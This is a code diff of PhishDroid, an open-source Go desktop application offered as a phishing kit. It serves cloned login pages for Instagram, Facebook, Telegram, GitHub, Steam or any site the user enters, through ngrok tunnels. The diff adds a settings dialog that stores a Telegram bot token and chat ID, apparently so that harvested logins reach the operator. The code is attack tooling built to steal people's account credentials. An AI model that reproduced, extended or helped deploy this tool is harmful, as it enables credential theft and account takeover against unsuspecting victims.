@@ -25,10 +25,12 @@ import (
 	"fyne.io/fyne/widget"
 )
 
+var version float64 = 0.2
+var useTelegramBot = false
+var isThisOtoTGBot = false
+var tg tgBot
 var cizgi = widget.NewToolbarSeparator().ToolbarObject()
 var space = widget.NewLabel("")
-
-const version = 0.1
 
 func islem(win fyne.Window, uyg fyne.App, typePhis string) {
 	var fonksiyon func(fyne.Window, *widget.TextGrid, *string)
@@ -122,13 +124,13 @@ func main() {
 		}
 	}()
 
-	win.SetIcon(iconsource)
+	win.SetIcon(resourceFesPng)
 
 	icon := canvas.NewImageFromResource(resourceFesPng)
 	icon.FillMode = canvas.ImageFillOriginal
 
 	phishdroidText := widget.NewLabelWithStyle("PhishDroid  B E T A", fyne.TextAlignCenter, fyne.TextStyle{true, false, false})
-	codeksyinText := widget.NewLabelWithStyle("©Codeksiyon All Rights Reserved", fyne.TextAlignCenter, fyne.TextStyle{false, true, true})
+	codeksyinText := widget.NewLabelWithStyle("©Codeksiyon Freemium", fyne.TextAlignCenter, fyne.TextStyle{false, true, true})
 	infinity := widget.NewProgressBarInfinite()
 	infinity.Start()
 
@@ -168,8 +170,22 @@ func main() {
 func gui(uyg fyne.App, win fyne.Window) {
 	go func() {
 
-		if checkNgrok() {
+		if checkNgrok() { // if ngrok already avaible
+
+			if checkTGBotAvaible() { // vers 0.2
+				tgo, err := getTGBot()
+				if errHandler.HandlerBool(err) {
+					return
+				}
+				tg = *tgo
+
+				useTelegramBot = true
+				isThisOtoTGBot = true
+				fmt.Println(tg)
+
+			}
 			return
+			//
 		}
 		time.Sleep(time.Second * 3)
 		infi := dialog.NewProgressInfinite("ngrok downloading", "Ngrok downloading for your arch ("+runtime.GOARCH+")", win)
@@ -181,12 +197,13 @@ func gui(uyg fyne.App, win fyne.Window) {
 			infi.Hide()
 		}()
 		infi.Show()
+
 		runtime.GC()
 	}()
 
 	//customngroklink := widget.NewTextGridFromString("ngrok url waiting")
-	customLabel := widget.NewLabel("You can use every site's template")
-	customText := widget.NewTextGridFromString("How To\n\nType your site and presss go!")
+	customLabel := widget.NewLabel("You can use every site's template [unstable]")
+	customText := widget.NewTextGridFromString("Type your site and presss go!")
 	customEntry := widget.NewEntry()
 	customEntry.SetPlaceHolder("https://cartcurtweb.com/login")
 
@@ -275,20 +292,122 @@ func gui(uyg fyne.App, win fyne.Window) {
 	facebookGroup := widget.NewGroup("Facebook", facebookLoginButon, space, cizgi)
 	facebook := widget.NewAccordionItem("Facebook", facebookGroup)
 	accortdion := widget.NewAccordionContainer(instagram, facebook, telegram, github, steam)
+
+	// settings | version 0.2
+
+	settingsButton := widget.NewButtonWithIcon("Settings", theme.SettingsIcon(), func() { // vers 0.2
+		useTelegramCheck := widget.NewCheck("Use TelegramBots", func(tap bool) {
+			if !tap {
+				isThisOtoTGBot = false
+				useTelegramBot = false
+				return
+			}
+			if isThisOtoTGBot {
+				return
+			}
+			tgHash := widget.NewEntry()
+			tgHash.SetPlaceHolder("Bot Token (1231312-FGhsdjaa_ss)")
+
+			tgChatID := widget.NewEntry()
+			tgChatID.SetPlaceHolder("Chat ID ( 888928282 )")
+
+			go func() {
+				if checkTGBotAvaible() {
+					oldTG, err := getTGBot()
+					if errHandler.HandlerBool(err) {
+						return
+					}
+					tgHash.SetText(oldTG.hash)
+					tgChatID.SetText(oldTG.chatID)
+				}
+			}()
+
+			/*tgButton := widget.NewButton("ok", func() {
+				if tgHash.Text == "" || tgChatID.Text == "" {
+					dialog.ShowInformation("Empty Entry", "Please fill all entrys", win)
+					return
+				}
+				tgTest := NewtgBot(tgHash.Text, tgChatID.Text)
+				if ok, str := tgTest.test(); !ok {
+					dialog.ShowInformation("Telegram Say", str, win)
+					return
+				}
+				err := setTGBot(*tgTest)
+				if errHandler.HandlerBool(err) {
+					dialog.ShowError(err, win)
+					return
+				}
+				tg = *tgTest
+				useTelegramBot = true
+				isThisOtoTGBot = true
+
+				dialog.ShowInformation("Done", "We can go!", win)
+				return
+
+			})*/
+
+			tgBotVre := widget.NewVBox(tgHash, tgChatID /*, tgButton*/)
+			//dialog.ShowCustom("Type Ur Bot", "Back", tgBotVre, win)
+			dialog.ShowCustomConfirm("Type Your Bot", "Ok", "Cancel", tgBotVre, func(ok bool) {
+				if !ok {
+					return
+				}
+				if tgHash.Text == "" || tgChatID.Text == "" {
+					dialog.ShowInformation("Empty Entry", "Please fill all entrys", win)
+					return
+				}
+				tgTest := NewtgBot(tgHash.Text, tgChatID.Text)
+				if ok, str := tgTest.test(); !ok {
+					dialog.ShowInformation("Telegram Say", str, win)
+					return
+				}
+				err := setTGBot(*tgTest)
+				if errHandler.HandlerBool(err) {
+					dialog.ShowError(err, win)
+					return
+				}
+				tg = *tgTest
+				useTelegramBot = true
+				isThisOtoTGBot = true
+
+				dialog.ShowInformation("Done", "We can go!", win)
+				return
+			}, win)
+
+			/*if checkTGBotAvaible() {
+				oldTG, err := getTGBot()
+				if errHandler.HandlerBool(err) {
+					dialog.ShowError(err, win)
+					return
+				}
+
+
+			}*/
+		})
+		if useTelegramBot {
+			useTelegramCheck.SetChecked(true)
+		}
+		//useTelegramContent := widget.NewGroup("Use Telegram-Bot")
+		dialog.ShowCustom("Settings", "< Ok >", useTelegramCheck, win)
+	})
+	//
+
 	aboutTitle := widget.NewLabel("PhishDroid OpenSource GoLang Application")
-	versionArch := widget.NewTextGridFromString(fmt.Sprintf("\nVersion %s\nArch    %s\nGoVers  %s", fmt.Sprint(version), runtime.GOARCH, runtime.Version()))
+	versionArch := widget.NewTextGridFromString(fmt.Sprintf("\nVersion %s\nArch    %s\nGoVers  %s\nNumGoRoutine %d", fmt.Sprint(version), runtime.GOARCH, runtime.Version(), runtime.NumGoroutine()))
 	codeksiyonURL, _ := url.Parse("https://t.me/codeksiyon")
 	githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid")
-	raifpyURL, _ := url.Parse("https://t.me/raifpy")
-	grid := fyne.NewContainerWithLayout(layout.NewGridLayoutWithColumns(3), widget.NewHyperlink("@codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL), widget.NewHyperlink("@raifpy", raifpyURL))
-	aboutGroup := widget.NewVBox(aboutTitle, versionArch, grid)
+	releasesURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid/releases")
+	//raifpyURL, _ := url.Parse("https://t.me/raifpy")
+	//grid := fyne.NewContainerWithLayout(layout.NewGridLayoutWithRows(2), widget.NewHyperlink("@codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL))
+	//aboutGroup := widget.NewVBox(aboutTitle, versionArch, grid)
+	aboutGroup := widget.NewVBox(aboutTitle, versionArch, space, cizgi, fyne.NewContainerWithLayout(layout.NewHBoxLayout(), widget.NewHyperlink("Codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL), widget.NewHyperlink("Releases", releasesURL)))
 	about := widget.NewButtonWithIcon("About", theme.InfoIcon(), func() {
 		dialog.ShowCustom("About", "Back", aboutGroup, win)
 	})
 	cisim := canvas.NewImageFromResource(resourceTakPng)
 	cisim.FillMode = canvas.ImageFillOriginal
-	group := widget.NewGroupWithScroller("PhishDroid  B E T A", accortdion, custom, about, cisim, cizgi, widget.NewLabelWithStyle("@codeksiyon GPL3+", fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false}))
-	go func() { // Check is avaible new version
+	group := widget.NewGroupWithScroller("PhishDroid  B E T A", accortdion, custom, settingsButton, about, cisim, cizgi, widget.NewLabelWithStyle("@codeksiyon GPL3+", fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false}))
+	go func() { // Check; is avaible new version
 		verReq, err := http.Get("https://raw.githubusercontent.com/codeksiyon/PhishDroid/master/version")
 		if errHandler.HandlerBool(err) {
 			//group.Append(widget.NewTextGridFromString(err.Error()))
@@ -300,17 +419,33 @@ func gui(uyg fyne.App, win fyne.Window) {
 		if errHandler.HandlerBool(err) {
 			return
 		}
+
 		if reqVer > version {
+
+			// on vers; 0.2
+			var news string
+			wnReq, err := http.Get("https://raw.githubusercontent.com/codeksiyon/PhishDroid/master/news")
+			if !errHandler.HandlerBool(err) { // if there is no error
+				newsByte, _ := ioutil.ReadAll(wnReq.Body)
+				news = string(newsByte)
+
+			}
+
+			//
+
 			log.Println("Detected new version!")
 			newverslabel := widget.NewLabelWithStyle("New PhishDroid Version Avaible ! -> "+hamStr, fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false})
+			whatsnewlabel := widget.NewTextGridFromString(news)
 			newversbuton := widget.NewButton("Download", func() {
 				githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid/releases")
 				uyg.OpenURL(githubURL)
 
 			})
-			laylay := fyne.NewContainerWithLayout(layout.NewGridLayoutWithRows(2), newverslabel, newversbuton)
+
+			laylay := fyne.NewContainerWithLayout(layout.NewGridLayoutWithRows(3), newverslabel, whatsnewlabel, newversbuton)
 
 			group.Append(laylay)
+
 		}
 		runtime.GC()
 
